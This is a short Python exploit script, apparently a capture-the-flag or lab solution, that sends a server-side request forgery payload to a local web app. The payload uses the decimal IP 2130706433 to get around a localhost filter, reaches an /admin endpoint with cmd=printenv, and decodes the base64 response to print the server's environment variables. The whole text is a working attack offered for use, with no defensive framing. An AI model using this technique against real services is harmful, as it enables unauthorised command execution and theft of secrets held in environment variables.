import requests
import base64
import re

URL = 'http://localhost:5000/'

data = {'url':'http://2130706433:5000/admin?cmd=printenv'}
pattern = r"base64 version of the site:\s*b'([^']*)'"

req = requests.post(URL,data=data)
match = re.search(pattern,req.text)
if match:
	b64decode = base64.b64decode(match.group(1))
	print(b64decode.decode())
else:
	print(req.text)

